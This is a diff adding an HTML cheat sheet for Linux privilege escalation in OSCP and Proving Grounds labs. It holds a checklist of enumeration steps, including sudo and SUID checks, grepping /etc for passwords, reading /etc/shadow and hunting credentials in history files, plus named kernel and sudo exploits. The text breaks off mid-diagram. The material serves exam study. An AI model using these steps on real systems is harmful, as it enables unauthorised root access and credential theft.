@@ -1,0 +1,1742 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LINUX_PRIVESC_PATTERN_BANK // oscp · user → root · pg-grounded</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Stencil+Text:wght@400;700;900&family=JetBrains+Mono:wght@300;400;500;700;800&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-base: #0a0d12; --bg-elev: #11151c; --bg-card: #0f1219; --bg-card-hover: #141823;
+    --border: #1d2230; --border-strong: #2a3145;
+    --text: #d8dde6; --text-dim: #8b94a7; --text-faint: #4a5266;
+    --setup: #ffb547; --setup-soft: #ffb54720;
+    --access: #ff6b6b; --access-soft: #ff6b6b18;
+    --enum: #5ec3e3; --enum-soft: #5ec3e318;
+    --abuse: #d96cd9; --abuse-soft: #d96cd918;
+    --win: #5fd49b; --win-soft: #5fd49b18;
+    --warn: #ff6b6b; --warn-soft: #ff6b6b18;
+    --theme: var(--win); --theme-soft: var(--win-soft);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    background: var(--bg-base); color: var(--text);
+    font-family: 'IBM Plex Sans', -apple-system, sans-serif;
+    font-size: 14px; line-height: 1.5; min-height: 100vh;
+    background-image: radial-gradient(circle at 15% 20%, rgba(95, 212, 155, 0.05) 0%, transparent 40%), radial-gradient(circle at 85% 80%, rgba(255, 181, 71, 0.03) 0%, transparent 40%);
+    background-attachment: fixed;
+  }
+  body::before { content: ''; position: fixed; inset: 0; pointer-events: none;
+    background: repeating-linear-gradient(0deg, rgba(255,255,255,0.012) 0px, rgba(255,255,255,0.012) 1px, transparent 1px, transparent 3px); z-index: 1; }
+  ::selection { background: var(--theme); color: var(--bg-base); }
+  ::-webkit-scrollbar { width: 8px; height: 8px; }
+  ::-webkit-scrollbar-track { background: var(--bg-base); }
+  ::-webkit-scrollbar-thumb { background: var(--border-strong); }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text-faint); }
+  a { color: inherit; text-decoration: none; }
+
+  .header { position: sticky; top: 0; z-index: 100; background: rgba(10, 13, 18, 0.94); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); padding: 16px 28px 12px; }
+  .header-top { display: flex; align-items: baseline; justify-content: space-between; gap: 20px; margin-bottom: 12px; }
+  .brand { font-family: 'Big Shoulders Stencil Text', sans-serif; font-weight: 900; font-size: 30px; letter-spacing: 0.08em; line-height: 0.9; text-transform: uppercase; }
+  .brand .ad { color: var(--theme); }
+  .brand-tag { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); letter-spacing: 0.15em; text-transform: uppercase; margin-top: 4px; }
+  .meta { text-align: right; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; }
+  .meta .count { color: var(--win); font-weight: 700; }
+  .search-row { display: flex; gap: 12px; align-items: stretch; }
+  .search-box { flex: 1; position: relative; }
+  .search-input { width: 100%; background: var(--bg-card); border: 1px solid var(--border-strong); color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 14px; font-weight: 500; padding: 11px 90px 11px 36px; outline: none; transition: border-color 0.15s, box-shadow 0.15s; }
+  .search-input:focus { border-color: var(--theme); box-shadow: 0 0 0 3px var(--theme-soft); }
+  .search-input::placeholder { color: var(--text-faint); }
+  .search-prefix { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--theme); font-family: 'JetBrains Mono', monospace; font-weight: 700; pointer-events: none; }
+  .search-kbd { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); display: flex; gap: 4px; pointer-events: none; }
+  .kbd { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-dim); background: var(--bg-base); border: 1px solid var(--border-strong); padding: 2px 6px; letter-spacing: 0.05em; }
+  .nav { margin-top: 12px; display: flex; gap: 4px; flex-wrap: wrap; align-items: center; }
+  .nav-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.15em; margin-right: 8px; }
+  .nav a { font-family: 'JetBrains Mono', monospace; font-size: 10.5px; color: var(--text-dim); padding: 4px 10px; border: 1px solid var(--border-strong); text-transform: uppercase; letter-spacing: 0.08em; transition: all 0.12s; }
+  .nav a:hover { color: var(--text); border-color: var(--text-dim); }
+  .nav a[data-phase="enum"]:hover { color: var(--enum); border-color: var(--enum); }
+  .nav a[data-phase="abuse"]:hover { color: var(--abuse); border-color: var(--abuse); }
+  .nav a[data-phase="win"]:hover { color: var(--win); border-color: var(--win); }
+
+  main { max-width: 1400px; margin: 0 auto; padding: 28px 28px 60px; position: relative; z-index: 2; }
+  .topology { background: var(--bg-card); border: 1px solid var(--border-strong); border-left: 3px solid var(--theme); padding: 16px 18px; margin-bottom: 32px; font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); line-height: 1.7; }
+  .topology h3 { font-size: 11px; color: var(--theme); letter-spacing: 0.18em; text-transform: uppercase; margin-bottom: 8px; font-family: 'JetBrains Mono', monospace; }
+  .topology code { color: var(--text); background: var(--bg-base); padding: 1px 5px; font-size: 11px; }
+
+  section.flow { margin-bottom: 56px; scroll-margin-top: 180px; }
+  .flow-head { display: flex; align-items: baseline; justify-content: space-between; gap: 16px; margin-bottom: 6px; padding-bottom: 8px; border-bottom: 1px solid var(--border-strong); }
+  .flow-num { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); letter-spacing: 0.15em; }
+  .flow-title { font-family: 'JetBrains Mono', monospace; font-size: 22px; font-weight: 800; letter-spacing: 0.02em; flex: 1; }
+  .flow-trigger { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); letter-spacing: 0.05em; text-align: right; max-width: 360px; }
+  .flow-trigger strong { color: var(--theme); font-weight: 500; }
+  .flow-intro { font-size: 13px; color: var(--text-dim); margin-bottom: 18px; max-width: 850px; line-height: 1.65; }
+  .flow-intro code { font-family: 'JetBrains Mono', monospace; font-size: 11.5px; color: var(--text); background: var(--bg-card); padding: 1px 5px; border: 1px solid var(--border); }
+
+  .reminder { display: inline-flex; align-items: center; gap: 6px; background: var(--bg-card); border: 1px dashed var(--border-strong); padding: 6px 12px; font-family: 'JetBrains Mono', monospace; font-size: 10.5px; color: var(--text-dim); margin: 8px 8px 8px 0; }
+  .reminder.timing { border-left: 2px solid var(--setup); }
+  .reminder.flag { border-left: 2px solid var(--win); color: var(--win); }
+  .reminder.danger { border-left: 2px solid var(--warn); color: var(--warn); }
+  .reminder.timing::before { content: '⏱'; }
+  .reminder.flag::before { content: '⚑'; }
+  .reminder.danger::before { content: '⚠'; }
+
+  .diagram { background: var(--bg-card); border: 1px solid var(--border); padding: 20px 16px; margin: 18px 0 22px; overflow-x: auto; }
+  .diagram svg { display: block; width: 100%; height: auto; }
+  .diagram svg .node-rect { fill: var(--bg-base); stroke: var(--border-strong); stroke-width: 1.2; transition: stroke 0.15s, fill 0.15s; }
+  .diagram svg a:hover .node-rect { fill: var(--bg-card-hover); stroke: var(--text-dim); cursor: pointer; }
+  .diagram svg .node-rect.setup  { stroke: var(--setup); }
+  .diagram svg .node-rect.access { stroke: var(--access); }
+  .diagram svg .node-rect.enum   { stroke: var(--enum); }
+  .diagram svg .node-rect.abuse  { stroke: var(--abuse); }
+  .diagram svg .node-rect.win    { stroke: var(--win); }
+  .diagram svg .node-rect.warn   { stroke: var(--warn); stroke-dasharray: 4 3; }
+  .diagram svg .node-text { fill: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 600; text-anchor: middle; pointer-events: none; }
+  .diagram svg .node-sub { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-anchor: middle; pointer-events: none; }
+  .diagram svg .arrow { stroke: var(--text-faint); stroke-width: 1.2; fill: none; marker-end: url(#arrowhead); }
+  .diagram svg .label { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-anchor: middle; pointer-events: none; }
+  .diagram svg .group-bg { fill: rgba(95, 212, 155, 0.03); stroke: var(--border); stroke-dasharray: 3 3; stroke-width: 1; }
+  .diagram svg .group-label { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; }
+
+  .cards-section { margin-top: 60px; padding-top: 24px; border-top: 1px solid var(--border-strong); scroll-margin-top: 180px; }
+  .filters { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; margin: 14px 0 20px; }
+  .filter-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.15em; margin-right: 4px; }
+  .pill { font-family: 'JetBrains Mono', monospace; font-size: 10.5px; font-weight: 500; color: var(--text-dim); background: transparent; border: 1px solid var(--border-strong); padding: 5px 12px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.08em; transition: all 0.12s; user-select: none; }
+  .pill:hover { border-color: var(--text-dim); color: var(--text); }
+  .pill.active { background: var(--theme); color: var(--bg-base); border-color: var(--theme); font-weight: 700; }
+  .pill .pill-count { opacity: 0.65; margin-left: 4px; font-weight: 400; }
+  .pill.active .pill-count { opacity: 0.7; }
+
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 14px; }
+  .card { background: var(--bg-card); border: 1px solid var(--border); padding: 15px 15px 13px; position: relative; transition: border-color 0.15s, background 0.15s; display: flex; flex-direction: column; gap: 9px; scroll-margin-top: 200px; }
+  .card:hover { border-color: var(--border-strong); background: var(--bg-card-hover); }
+  .card[data-phase="enum"]   { border-left: 3px solid var(--enum); }
+  .card[data-phase="abuse"]  { border-left: 3px solid var(--abuse); }
+  .card[data-phase="win"]    { border-left: 3px solid var(--win); }
+  .card.flash { animation: flash 1.2s ease-out; }
+  @keyframes flash { 0%, 30% { background: var(--theme-soft); border-color: var(--theme); } 100% { background: var(--bg-card); border-color: var(--border); } }
+  .card-head { display: flex; justify-content: space-between; align-items: flex-start; gap: 8px; }
+  .card-cat { font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; padding: 2px 6px; border: 1px solid; flex-shrink: 0; white-space: nowrap; }
+  .card[data-phase="enum"]   .card-cat { color: var(--enum); border-color: var(--enum); }
+  .card[data-phase="abuse"]  .card-cat { color: var(--abuse); border-color: var(--abuse); }
+  .card[data-phase="win"]    .card-cat { color: var(--win); border-color: var(--win); }
+  .card-title { font-family: 'JetBrains Mono', monospace; font-size: 13.5px; font-weight: 700; color: var(--text); line-height: 1.3; flex: 1; }
+  .triggers { display: flex; flex-wrap: wrap; gap: 4px; }
+  .trigger { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--theme); background: var(--theme-soft); border: 1px solid var(--theme-soft); padding: 2px 7px; letter-spacing: 0.02em; }
+  .trigger.match { background: var(--theme); color: var(--bg-base); font-weight: 700; }
+  .arrow-line { display: flex; align-items: flex-start; gap: 8px; padding: 8px 10px; background: var(--bg-base); border: 1px solid var(--border); }
+  .arrow { color: var(--win); font-family: 'JetBrains Mono', monospace; font-weight: 800; flex-shrink: 0; }
+  .action { color: var(--text); font-size: 12.5px; line-height: 1.5; }
+  .cmd-wrap { position: relative; }
+  .cmd { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text); background: var(--bg-base); border: 1px solid var(--border); padding: 9px 36px 9px 11px; white-space: pre-wrap; word-break: break-all; line-height: 1.5; overflow-x: auto; }
+  .cmd-copy { position: absolute; top: 4px; right: 4px; background: var(--bg-card); border: 1px solid var(--border-strong); color: var(--text-dim); font-family: 'JetBrains Mono', monospace; font-size: 9px; padding: 3px 6px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.1em; opacity: 0; transition: opacity 0.15s, color 0.15s; }
+  .cmd-wrap:hover .cmd-copy { opacity: 1; }
+  .cmd-copy:hover { color: var(--theme); }
+  .cmd-copy.copied { color: var(--win); border-color: var(--win); opacity: 1; }
+  .cleanup { background: var(--warn-soft); border: 1px solid var(--warn); border-left-width: 3px; padding: 8px 11px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text); line-height: 1.5; white-space: pre-wrap; word-break: break-all; }
+  .cleanup-label { color: var(--warn); font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; display: block; margin-bottom: 4px; font-weight: 700; }
+  .card-foot { display: flex; justify-content: space-between; align-items: center; gap: 8px; margin-top: auto; padding-top: 4px; border-top: 1px dashed var(--border); font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); }
+  mark { background: var(--theme); color: var(--bg-base); padding: 0 2px; font-weight: 700; }
+  .pg-tag { display: inline-block; color: var(--win); background: var(--win-soft); border: 1px solid var(--win); padding: 1px 5px; font-size: 9px; letter-spacing: 0.05em; font-weight: 700; }
+  .empty { text-align: center; padding: 80px 20px; color: var(--text-faint); font-family: 'JetBrains Mono', monospace; }
+  .empty-icon { font-size: 48px; color: var(--border-strong); margin-bottom: 16px; }
+  .empty-title { color: var(--text-dim); font-size: 14px; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.15em; }
+  .empty-hint { font-size: 12px; color: var(--text-faint); }
+  .anti-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 12px; margin-top: 18px; }
+  .anti { background: var(--bg-card); border: 1px solid var(--border); border-left: 3px solid var(--warn); padding: 12px 14px; }
+  .anti-bad { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--warn); margin-bottom: 4px; line-height: 1.4; }
+  .anti-bad::before { content: '✗ '; font-weight: 800; }
+  .anti-fix { font-size: 12px; color: var(--text-dim); line-height: 1.5; }
+  .anti-fix::before { content: '→ '; color: var(--win); font-weight: 800; }
+  .foot-info { margin-top: 60px; padding-top: 20px; border-top: 1px solid var(--border); font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-align: center; line-height: 1.8; letter-spacing: 0.05em; }
+  .foot-info code { color: var(--theme); background: var(--theme-soft); padding: 1px 5px; }
+  .checklist { background: var(--bg-card); border: 1px solid var(--border); padding: 18px 22px; margin: 14px 0 22px; }
+  .checklist-title { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--theme); letter-spacing: 0.18em; text-transform: uppercase; margin-bottom: 12px; }
+  .checklist ul { list-style: none; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 4px 18px; }
+  .checklist li { font-family: 'JetBrains Mono', monospace; font-size: 12px; padding: 5px 0; color: var(--text); display: flex; align-items: flex-start; gap: 9px; line-height: 1.5; cursor: pointer; user-select: none; }
+  .checklist li::before { content: '[ ]'; color: var(--text-faint); font-weight: 700; flex-shrink: 0; transition: color 0.15s; }
+  .checklist li.done { color: var(--text-faint); text-decoration: line-through; }
+  .checklist li.done::before { content: '[✓]'; color: var(--win); }
+  .checklist li code { color: var(--theme); font-size: 11px; }
+  @media (max-width: 720px) {
+    .header { padding: 12px 14px 10px; }
+    main { padding: 18px 14px 40px; }
+    .brand { font-size: 22px; }
+    .grid { grid-template-columns: 1fr; }
+    .search-kbd { display: none; }
+    .flow-head { flex-direction: column; align-items: flex-start; }
+    .flow-trigger { text-align: left; max-width: 100%; }
+  }
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-top">
+    <div>
+      <div class="brand">LINUX<span class="ad">_</span>PRIVESC<span class="ad">_</span>PATTERN<span class="ad">_</span>BANK</div>
+      <div class="brand-tag">// oscp · user → root · pg-grounded</div>
+    </div>
+    <div class="meta">
+      <div>SHOWING <span class="count" id="resultCount">0</span> / <span id="totalCount">0</span></div>
+      <div style="margin-top:4px; opacity:0.6">v1 · linux privesc · companion to windows-privesc bank</div>
+    </div>
+  </div>
+  <div class="search-row">
+    <div class="search-box">
+      <span class="search-prefix">▸</span>
+      <input id="search" class="search-input" type="text" autocomplete="off" spellcheck="false"
+        placeholder="search: 'sudo', 'suid', 'cron wildcard', 'pwnkit', 'docker group', 'fail2ban', 'baron samedit' ..." />
+      <span class="search-kbd"><kbd class="kbd">⌘</kbd><kbd class="kbd">K</kbd></span>
+    </div>
+  </div>
+  <div class="nav">
+    <span class="nav-label">JUMP:</span>
+    <a href="#enum-flow" data-phase="enum">enum</a>
+    <a href="#cards" data-phase="abuse">sudo</a>
+    <a href="#cards" data-phase="abuse">suid</a>
+    <a href="#cards" data-phase="abuse">cron</a>
+    <a href="#cards" data-phase="abuse">groups</a>
+    <a href="#cards" data-phase="abuse">kernel</a>
+    <a href="#cards" style="margin-left:auto">all-cards</a>
+  </div>
+</header>
+
+<main>
+
+<div class="topology">
+  <h3>SCOPE · LINUX LOCAL PRIVILEGE ESCALATION</h3>
+  <div>
+    <code>start</code>: low-priv shell on linux box ·
+    <code>end</code>: uid=0(root) ·
+    <code>principle</code>: <span style="color:var(--theme)">enumerate exhaustively, then exploit</span> — most failed exam boxes fail at enum, not exploit ·
+    <code>pg-grounded</code>: cards marked <span class="pg-tag">PG #</span> are from your walkthroughs
+  </div>
+</div>
+
+<section>
+  <div class="flow-head">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ 00 ]</span>
+      <span class="flow-title" style="color:var(--theme)">PRIVESC CHECKLIST · LINUX</span>
+    </div>
+    <div class="flow-trigger">click to mark · expanded from your standalone bank</div>
+  </div>
+  <p class="flow-intro">
+    The discipline: every box gets the full sweep before any exploit attempt. linpeas runs first in the background while you go through the manual list. Re-enumerate after every lateral hop — same machine, new user, completely different attack surface.
+  </p>
+
+  <div class="checklist">
+    <div class="checklist-title">▸ 0. CONTEXT</div>
+    <ul>
+      <li>Full TTY — <code>python3 -c "__import__('pty').spawn('/bin/bash')"</code></li>
+      <li>Terminal size — Ctrl+Z, <code>stty raw -echo; fg</code>, <code>export TERM=xterm</code></li>
+      <li>Confirm user — <code>id; whoami; hostname; uname -a</code></li>
+      <li>Distro + version — <code>cat /etc/os-release; uname -r</code></li>
+    </ul>
+    <div class="checklist-title" style="margin-top:14px">▸ 1. AUTOMATED</div>
+    <ul>
+      <li>linpeas — <code>./linpeas.sh -a -P PWD</code> in background</li>
+      <li>LES — <code>./les.sh</code></li>
+      <li>pspy64 — passive process watch (catches root cron)</li>
+    </ul>
+    <div class="checklist-title" style="margin-top:14px">▸ 2. SUDO</div>
+    <ul>
+      <li><code>sudo -l</code> blank pwd AND user pwd</li>
+      <li>GTFOBins for every entry</li>
+      <li>NOPASSWD first · env_keep LD_PRELOAD/LD_LIBRARY_PATH</li>
+      <li>Sudo version — <code>sudo --version</code> → CVE-2021-3156 if &lt;1.9.5p2</li>
+      <li>CVE-2019-14287 — <code>sudo -u#-1</code> trick</li>
+    </ul>
+    <div class="checklist-title" style="margin-top:14px">▸ 3. SUID / SGID</div>
+    <ul>
+      <li><code>find / -perm -4000 -type f 2&gt;/dev/null</code></li>
+      <li><code>find / -perm -2000 -type f 2&gt;/dev/null</code></li>
+      <li>GTFOBins for each known binary</li>
+      <li>Unknown bin — <code>strings</code>, <code>ltrace</code>, <code>strace -f -e openat</code></li>
+      <li>Relative paths → PATH hijack</li>
+    </ul>
+    <div class="checklist-title" style="margin-top:14px">▸ 4. CAPABILITIES</div>
+    <ul>
+      <li><code>getcap -r / 2&gt;/dev/null</code></li>
+      <li>cap_setuid+ep → GTFOBins (python, perl, ruby)</li>
+      <li>cap_dac_read_search → read /etc/shadow</li>
+    </ul>
+    <div class="checklist-title" style="margin-top:14px">▸ 5. CRON / TIMERS / SERVICES</div>
+    <ul>
+      <li><code>cat /etc/crontab; ls -la /etc/cron.*</code></li>
+      <li><code>systemctl list-timers --all</code></li>
+      <li>Every script in cron → check writable</li>
+      <li>pspy for dynamic / out-of-crontab</li>
+      <li>PATH abuse — relative paths in cron script</li>
+      <li>Wildcard expansion — tar/chown/rsync <code>*</code></li>
+      <li>Writable .service units</li>
+    </ul>
+    <div class="checklist-title" style="margin-top:14px">▸ 6. GROUPS</div>
+    <ul>
+      <li><code>id</code> — what groups?</li>
+      <li>docker → mount /</li>
+      <li>lxd → image import privesc</li>
+      <li>disk → debugfs raw fs</li>
+      <li>adm → read /var/log</li>
+    </ul>
+    <div class="checklist-title" style="margin-top:14px">▸ 7. WRITABLES</div>
+    <ul>
+      <li><code>ls -la /etc/passwd /etc/shadow /etc/sudoers</code></li>
+      <li>SSH authorized_keys for other users</li>
+      <li><code>find / -writable -type d 2&gt;/dev/null | grep -v proc</code></li>
+    </ul>
+    <div class="checklist-title" style="margin-top:14px">▸ 8. CRED HUNT</div>
+    <ul>
+      <li>/var/www config files (DB creds)</li>
+      <li>/opt custom apps with hardcoded creds</li>
+      <li>~/.bash_history · ~/.mysql_history · ~/.viminfo</li>
+      <li>/var/mail/&lt;user&gt; (PG Plum, Fired)</li>
+      <li><code>grep -ri 'password' /etc/ 2&gt;/dev/null</code></li>
+    </ul>
+    <div class="checklist-title" style="margin-top:14px">▸ 9. PASSWORD REUSE</div>
+    <ul>
+      <li><code>su</code> every user with current pwd</li>
+      <li>Try usernames as passwords</li>
+      <li>Any cracked hash → try across users</li>
+    </ul>
+    <div class="checklist-title" style="margin-top:14px">▸ 10. KERNEL (LAST RESORT)</div>
+    <ul>
+      <li>LES output</li>
+      <li>Polkit pkexec (CVE-2021-4034)</li>
+      <li>DirtyPipe (5.8-5.17)</li>
+      <li>OverlayFS Ubuntu (CVE-2021-3493)</li>
+    </ul>
+  </div>
+  <div class="reminder timing">budget: 30-45 min full enum before any exploit attempt</div>
+  <div class="reminder flag">linpeas FIRST in background — work in parallel</div>
+  <div class="reminder danger">do not kernel-exploit early — may crash the box</div>
+</section>
+
+<section id="enum-flow" class="flow">
+  <div class="flow-head">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ 01 ]</span>
+      <span class="flow-title" style="color:var(--theme)">ENUM RESULT → ATTACK CARD</span>
+    </div>
+    <div class="flow-trigger">TRIGGER · <strong>"linpeas finished — what's the win?"</strong></div>
+  </div>
+  <p class="flow-intro">
+    Map every interesting enum finding to the right exploit card. Click any leaf to jump to its card with exact commands. Priority: sudo &gt; suid &gt; cron/svc &gt; groups &gt; kernel.
+  </p>
+
+  <div class="diagram">
+    <svg viewBox="0 0 1100 480" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <marker id="arrowhead" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#4a5266"/></marker>
+      </defs>
+
+      <a href="#card-linpeas-run"><rect class="node-rect enum" x="430" y="10" width="240" height="48"/>
+        <text class="node-text" x="550" y="32">LINPEAS + MANUAL SWEEP</text>
+        <text class="node-sub" x="550" y="46">linpeas -a + sudo-l + suid + caps</text></a>
+
+      <rect class="group-bg" x="20" y="80" width="200" height="380"/>
+      <text class="group-label" x="40" y="100">SUDO -L SHOWED</text>
+
+      <a href="#card-sudo-gtfo"><rect class="node-rect abuse" x="30" y="115" width="180" height="42"/>
+        <text class="node-text" x="120" y="135">GTFO binary</text>
+        <text class="node-sub" x="120" y="148">gtfobins lookup</text></a>
+      <a href="#card-sudo-ld-preload"><rect class="node-rect abuse" x="30" y="165" width="180" height="42"/>
+        <text class="node-text" x="120" y="185">env_keep LD_PRELOAD</text>
+        <text class="node-sub" x="120" y="198">.so payload</text></a>
+      <a href="#card-sudo-path-hijack"><rect class="node-rect abuse" x="30" y="215" width="180" height="42"/>
+        <text class="node-text" x="120" y="235">sudo + rel-path bin</text>
+        <text class="node-sub" x="120" y="248">PATH hijack</text></a>
+      <a href="#card-sudo-baron-samedit"><rect class="node-rect abuse" x="30" y="265" width="180" height="42"/>
+        <text class="node-text" x="120" y="285">sudo &lt; 1.9.5p2</text>
+        <text class="node-sub" x="120" y="298">CVE-2021-3156</text></a>
+      <a href="#card-sudo-script-writable"><rect class="node-rect abuse" x="30" y="315" width="180" height="42"/>
+        <text class="node-text" x="120" y="335">sudo writable script</text>
+        <text class="node-sub" x="120" y="348">edit script</text></a>
+      <a href="#card-apt-get-sudo"><rect class="node-rect abuse" x="30" y="365" width="180" height="42"/>
+        <text class="node-text" x="120" y="385">sudo apt-get/apt</text>
+        <text class="node-sub" x="120" y="398"><tspan fill="#5fd49b">PG #59 Press</tspan></text></a>
+
+      <rect class="group-bg" x="232" y="80" width="200" height="380"/>
+      <text class="group-label" x="252" y="100">SUID / CAPS</text>
+
+      <a href="#card-suid-gtfo"><rect class="node-rect abuse" x="242" y="115" width="180" height="42"/>
+        <text class="node-text" x="332" y="135">SUID known binary</text>
+        <text class="node-sub" x="332" y="148">gtfobins SUID</text></a>
+      <a href="#card-suid-unknown"><rect class="node-rect abuse" x="242" y="165" width="180" height="42"/>
+        <text class="node-text" x="332" y="185">SUID unknown bin</text>
+        <text class="node-sub" x="332" y="198">strings/strace</text></a>
+      <a href="#card-suid-shared-object"><rect class="node-rect abuse" x="242" y="215" width="180" height="42"/>
+        <text class="node-text" x="332" y="235">SUID + writable .so</text>
+        <text class="node-sub" x="332" y="248">shared-obj inject</text></a>
+      <a href="#card-cap-setuid"><rect class="node-rect abuse" x="242" y="265" width="180" height="42"/>
+        <text class="node-text" x="332" y="285">cap_setuid+ep</text>
+        <text class="node-sub" x="332" y="298">os.setuid(0)</text></a>
+      <a href="#card-cap-dac-read"><rect class="node-rect abuse" x="242" y="315" width="180" height="42"/>
+        <text class="node-text" x="332" y="335">cap_dac_read</text>
+        <text class="node-sub" x="332" y="348">read /etc/shadow</text></a>
+      <a href="#card-suid-python"><rect class="node-rect abuse" x="242" y="365" width="180" height="42"/>
+        <text class="node-text" x="332" y="385">SUID python/perl</text>
+        <text class="node-sub" x="332" y="398"><tspan fill="#5fd49b">PG #20 Levram</tspan></text></a>
+
+      <rect class="group-bg" x="444" y="80" width="200" height="380"/>
+      <text class="group-label" x="464" y="100">CRON / SVC</text>
+
+      <a href="#card-cron-writable-script"><rect class="node-rect abuse" x="454" y="115" width="180" height="42"/>
+        <text class="node-text" x="544" y="135">cron writable script</text>
+        <text class="node-sub" x="544" y="148"><tspan fill="#5fd49b">PG #56 Law</tspan></text></a>
+      <a href="#card-cron-path-hijack"><rect class="node-rect abuse" x="454" y="165" width="180" height="42"/>
+        <text class="node-text" x="544" y="185">cron PATH hijack</text>
+        <text class="node-sub" x="544" y="198"><tspan fill="#5fd49b">PG #2 muddy</tspan></text></a>
+      <a href="#card-cron-wildcard"><rect class="node-rect abuse" x="454" y="215" width="180" height="42"/>
+        <text class="node-text" x="544" y="235">tar/chown * in cron</text>
+        <text class="node-sub" x="544" y="248"><tspan fill="#5fd49b">PG #25 Readys</tspan></text></a>
+      <a href="#card-service-writable"><rect class="node-rect abuse" x="454" y="265" width="180" height="42"/>
+        <text class="node-text" x="544" y="285">writable .service</text>
+        <text class="node-sub" x="544" y="298"><tspan fill="#5fd49b">PG #38 Hetemit</tspan></text></a>
+      <a href="#card-systemd-suid"><rect class="node-rect abuse" x="454" y="315" width="180" height="42"/>
+        <text class="node-text" x="544" y="335">sudo systemctl</text>
+        <text class="node-sub" x="544" y="348"><tspan fill="#5fd49b">PG #60 Scrutiny</tspan></text></a>
+      <a href="#card-fail2ban-actionban"><rect class="node-rect abuse" x="454" y="365" width="180" height="42"/>
+        <text class="node-text" x="544" y="385">fail2ban actiond</text>
+        <text class="node-sub" x="544" y="398"><tspan fill="#5fd49b">⭐ PG #10 Fail</tspan></text></a>
+
+      <rect class="group-bg" x="656" y="80" width="200" height="380"/>
+      <text class="group-label" x="676" y="100">GROUP MEMBER</text>
+
+      <a href="#card-docker-group"><rect class="node-rect abuse" x="666" y="115" width="180" height="42"/>
+        <text class="node-text" x="756" y="135">docker group</text>
+        <text class="node-sub" x="756" y="148"><tspan fill="#5fd49b">PG #70 Peppo</tspan></text></a>
+      <a href="#card-lxd-group"><rect class="node-rect abuse" x="666" y="165" width="180" height="42"/>
+        <text class="node-text" x="756" y="185">lxd / lxc group</text>
+        <text class="node-sub" x="756" y="198">priv container</text></a>
+      <a href="#card-disk-group"><rect class="node-rect abuse" x="666" y="215" width="180" height="42"/>
+        <text class="node-text" x="756" y="235">disk / 6(disk)</text>
+        <text class="node-sub" x="756" y="248"><tspan fill="#5fd49b">PG #48 Extplorer</tspan></text></a>
+      <a href="#card-adm-group"><rect class="node-rect abuse" x="666" y="265" width="180" height="42"/>
+        <text class="node-text" x="756" y="285">adm group</text>
+        <text class="node-sub" x="756" y="298">read /var/log</text></a>
+      <a href="#card-rbash-escape"><rect class="node-rect abuse" x="666" y="315" width="180" height="42"/>
+        <text class="node-text" x="756" y="335">rbash / rsh</text>
+        <text class="node-sub" x="756" y="348"><tspan fill="#5fd49b">PG #70 Peppo</tspan></text></a>
+      <a href="#card-container-escape"><rect class="node-rect abuse" x="666" y="365" width="180" height="42"/>
+        <text class="node-text" x="756" y="385">in docker container</text>
+        <text class="node-sub" x="756" y="398">escape</text></a>
+
+      <rect class="group-bg" x="868" y="80" width="212" height="380"/>
+      <text class="group-label" x="888" y="100">KERNEL / MISC</text>
+
+      <a href="#card-pwnkit"><rect class="node-rect abuse" x="878" y="115" width="192" height="42"/>
+        <text class="node-text" x="974" y="135">pkexec pwnkit</text>
+        <text class="node-sub" x="974" y="148"><tspan fill="#5fd49b">PG #18 Exghost</tspan></text></a>
+      <a href="#card-dirty-pipe"><rect class="node-rect abuse" x="878" y="165" width="192" height="42"/>
+        <text class="node-text" x="974" y="185">DirtyPipe 5.8-5.17</text>
